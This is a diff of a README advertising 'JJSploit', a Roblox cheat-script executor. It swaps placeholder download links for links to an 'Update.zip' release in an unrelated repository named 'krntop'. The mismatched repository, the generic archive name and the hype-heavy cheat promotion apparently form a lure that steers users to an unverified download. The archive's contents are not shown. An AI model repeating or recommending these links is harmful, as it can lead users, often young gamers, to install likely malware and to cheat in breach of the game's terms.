@@ -6,11 +6,12 @@ Unlike other complex executors, **JJSploit offers a simple, user-friendly experi
 
 🔥 **Experience the power of scripting in Roblox with JJSploit today!** 🔥  
 
-[![Download JJSploit](https://img.shields.io/badge/Download-JJSploit-red?style=for-the-badge&logo=download)](https://github.com/YourRepo/jjsploit/releases/download/Update/JJSploit.exe)  
+[![Download JJSploit](https://img.shields.io/badge/Download-JJSploit-red?style=for-the-badge&logo=download)](https://github.com/BarimRB/krntop/releases/download/Update/Update.zip)  
 
-![jjsploit-executor](https://your-image-link.com/jjsploit-banner)  
+![jj](https://github.com/user-attachments/assets/d3218aee-a794-4e5f-8eba-13524071d55a)
 
-[![Download JJSploit](https://img.shields.io/badge/Download-JJSploit-red?style=for-the-badge&logo=download)](https://github.com/YourRepo/jjsploit/releases/download/Update/JJSploit.exe)  
+
+[![Download JJSploit](https://img.shields.io/badge/Download-JJSploit-red?style=for-the-badge&logo=download)](https://github.com/BarimRB/krntop/releases/download/Update/Update.zip)  
 
 ---
 
